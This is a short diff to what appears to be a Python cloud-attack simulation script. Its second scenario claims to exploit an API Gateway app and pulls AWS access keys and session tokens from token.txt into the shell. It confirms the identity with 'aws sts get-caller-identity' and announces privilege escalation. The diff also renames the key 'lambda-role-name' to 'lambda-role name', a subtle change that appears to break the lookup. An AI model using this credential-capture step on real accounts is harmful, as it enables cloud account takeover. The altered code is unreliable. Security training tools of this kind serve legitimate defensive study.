@@ -137,7 +137,7 @@ def scenario_2_execute():
         data = json.load(file)
 
     API_GW_URL = data["apigateway-rest-endpoint"]
-    LAMBDA_ROLE_NAME = data["lambda-role-name"]
+    LAMBDA_ROLE_NAME = data["lambda-role name"]
 
     print(colored("Exploiting the Application on API GW", color="red"))
     loading_animation()
@@ -154,13 +154,11 @@ def scenario_2_execute():
 
     creds = "export $(grep -e AWS_ACCESS_KEY_ID -e AWS_SECRET_ACCESS_KEY -e AWS_SESSION_TOKEN token.txt)"
     subprocess.call(""+creds+" && aws sts get-caller-identity", shell=True)
-    #role_name = subprocess.check_output(""+creds+" && aws sts get-caller-identity | jq -r '.Arn' | cut -d'/' -f2", shell=True)
-    #print(role_name)
     
     print(colored("PrivEsc possible through this credential, Escalating role privileges", color="red"))
     loading_animation()
     print("-"*30)
-
+    
 
 
 
